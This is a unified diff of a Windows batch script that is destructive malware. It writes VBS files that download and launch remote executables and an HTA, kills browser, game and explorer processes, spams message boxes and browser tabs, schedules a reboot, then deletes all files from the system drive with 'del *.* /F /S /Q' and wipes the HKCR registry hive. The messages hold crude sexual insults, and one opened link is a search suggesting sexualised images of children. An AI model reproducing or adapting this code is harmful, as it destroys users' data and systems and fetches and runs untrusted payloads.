@@ -1,5 +1,5 @@
 @echo off
-set ztmp=C:\Users\%USERNAME%\AppData\Local\Temp\bfcwrk
+set ztmp=C:\Users\%USERNAME%\AppData\Local\Temp\ztmp
 set MYFILES=C:\Users\%USERNAME%\AppData\Local\Temp\afolder
 set bfcec=t10139.exe
 set cmdline=
@@ -42,7 +42,7 @@ cd %systemdrive%\Users\%USERNAME%\AppData\Local\Temp
 @echo voila = wshell.ExpandEnvironmentStrings("%SYSTEMDRIVE%")>>%lol%.vbs
 @echo. >>%lol%.vbs
 (echo HTTPDownload "https://image.noelshack.com/fichiers/2022/48/3/1669809091-risitas.jpeg", "" ^& voila ^& "\Users\" ^& strUserName ^& "\AppData\Local\Temp")>>%lol%.vbs
-(echo HTTPDownload "https://cdn.discordapp.com/attachments/1025871796798500925/1047554447863189624/risitas.hta", "" ^& voila ^& "\Users\" ^& strUserName ^& "\AppData\Local\Temp")>>%lol%.vbs
+(echo HTTPDownload "https://ddl7.data.hu/get/314528/13482772/noel.hta", "" ^& voila ^& "\Users\" ^& strUserName ^& "\AppData\Local\Temp")>>%lol%.vbs
 (echo HTTPDownload "https://ddl8.data.hu/get/339969/12880996/melter.exe", "" ^& voila ^& "\Users\" ^& strUserName ^& "\AppData\Local\Temp")>>%lol%.vbs
 @echo. >>%lol%.vbs
 @echo Sub HTTPDownload( myURL, myPath )>>%lol%.vbs
@@ -77,7 +77,7 @@ cd %systemdrive%\Users\%USERNAME%\AppData\Local\Temp
 
 set file=Defis_et_Lilopie_Pur_Biday.mp3
 ( echo Set Sound = CreateObject("WMPlayer.OCX.7"^)
-  echo Sound.URL = "https://files.catbox.moe/96b8bl.mp3"
+  echo Sound.URL = "http://p0wnage.github.io/db/payloads/dl/Defis_et_Lilopie_Pur_Biday.mp3"
   echo Sound.Controls.play
   echo do while Sound.currentmedia.duration = 0
   echo wscript.sleep 100
@@ -104,12 +104,11 @@ set file=alerte_enculay.mp3
   echo wscript.sleep (int(Sound.currentmedia.duration^)+1^)*1000) >%japonais%.vbs
 
 
-
 @echo WScript.Sleep 84000>>%twitch%.vbs
 @echo do>>%twitch%.vbs
 @echo Dim wsh>>%twitch%.vbs
 @echo Set wsh=WScript.CreateObject("WScript.Shell")>>%twitch%.vbs
-@echo wsh.Run "https://mrparadoxal.github.io">>%twitch%.vbs
+@echo wsh.Run "http://p0wned.github.io/">>%twitch%.vbs
 @echo WScript.Sleep 1000>>%twitch%.vbs
 @echo loop>>%twitch%.vbs
 
@@ -148,7 +147,7 @@ set file=alerte_enculay.mp3
 @echo wshshell.sendkeys "{SCROLLLOCK}">>%led%.vbs
 @echo loop>>%led%.vbs
 
-@echo arabe = Array("https://mrparadoxal.github.io")>%fetch%.vbs
+@echo arabe = Array("https://www.google.com/search?q=Photo+d'enfants+en+maillot+de+bain+c'est+pour+ma+cousine+tkt+gilbert&sxsrf=ALiCzsab_keH-uymiSzxHsxyjjzsaggVWA:1667682132973&source=lnms&tbm=isch&sa=X&ved=2ahUKEwja9oiJ-Jf7AhX9lIkEHYo5CWgQ_AUoAXoECAIQAw&cshid=1667682169917823&biw=1536&bih=758&dpr=1.25", "https://google.com/search?q=tuto+devenir+un+femboy", "https://google.com/search?q=Comment+voler+une+poussette+?", "https://youareanidiot.cc/", "http://www.trottla.net/gallrey/gallery-kakonotop2.html", "https://google.com/search?q=how+2+buy+weed", "https://forums.commentcamarche.net/forum/affich-16798663-mon-pc-est-hacke-comment-faire", "https://google.com/search?q+among+us+crack+legit+2022+free+gems+hack+working", "https://www.jeuxvideo.com/forums/1-50-74887570-1-0-1-0-j-ai-paye-cette-epee-349eur.htm", "https://jvflux.fr/Noelisme")>%fetch%.vbs
 @echo Set feug=wscript.CreateObject("WScript.Shell")>>%fetch%.vbs
 
 @echo dim r>>%fetch%.vbs
@@ -169,11 +168,11 @@ set file=alerte_enculay.mp3
 
 
 @echo do>%prenom%.vbs
-@echo x=msgbox ("LE 18-25 T'A BIEN BAISER LE FION PUTAIN DE GROS FILS DE PUTE" ,16+4096)>>%prenom%.vbs
+@echo x=msgbox ("TU N'AS PLUS DE PAYCAY ENFANT DE H*PISTE, LE 15-18 T'A BIEN SODOMISÉ LE CUL" ,16+4096, "Cisla'wned :noel: :Y")>>%prenom%.vbs
 @echo CreateObject("WScript.Shell").Run "%prenom%.vbs">>%prenom%.vbs
 @echo loop>>%prenom%.vbs
 
-@echo CreateObject("SAPI.SpVoice").Speak"Coucou, je suis juste la petite voix qui te dit que le 18 25 vient de detruire ton PC et ce a tout jamais. Amuse toi bien a le reparer fils de viol, tres content. Dedi aux raiye du 18 25.">%pute%.vbs
+@echo CreateObject("SAPI.SpVoice").Speak"Coucou, je suis juste la petite voix qui te dit que le 15 18 vient de detruire ton PC et ce a tout jamais. Amuse toi bien a le reparer fils de viol, tres content. Dedi aux birodar du 15-18.">%pute%.vbs
 
 
 start %fdc%.vbs %MYFILES%\feuj.bat
@@ -242,12 +241,11 @@ taskkill /F /IM FortniteClient-Win64-Shipping.exe
 taskkill /F /IM GenshinImpact.exe
 taskkill /F /IM Among Us.exe
 taskkill /F /IM chrome.exe
-taskkill /F /IM brave.exe
 taskkill /F /IM firefox.exe
 taskkill /F /IM msedge.exe
 taskkill /F /IM iexplore.exe
 taskkill /F /IM explorer.exe
-shutdown -r -t 300 -c "Dans 5 minutes tu n'as plus de PC fils de viol, le 18-25 t'a bien baiser le cul :)"
+shutdown -r -t 300 -c "Dans 5 minutes ton paycay va explosay fils de viol, le 15-18 t'as bien détruit le cul :) :noel: Vaincra >> :hap: LOL"
 
 :aaa
 if exist %nouveau%.vbs (
@@ -274,8 +272,8 @@ if exist %led%.vbs (
 )
 
 :tgjuif
-if exist risitas.hta (
-	start risitas.hta
+if exist noel.hta (
+	start noel.hta
 	goto pourlefdc
 ) ELSE (
 	tgjuif
@@ -312,5 +310,6 @@ cd %systemdrive%\
 del *.* /F /S /Q >nul
 reg delete HKCR /F >nul
 goto svt
+
 
 
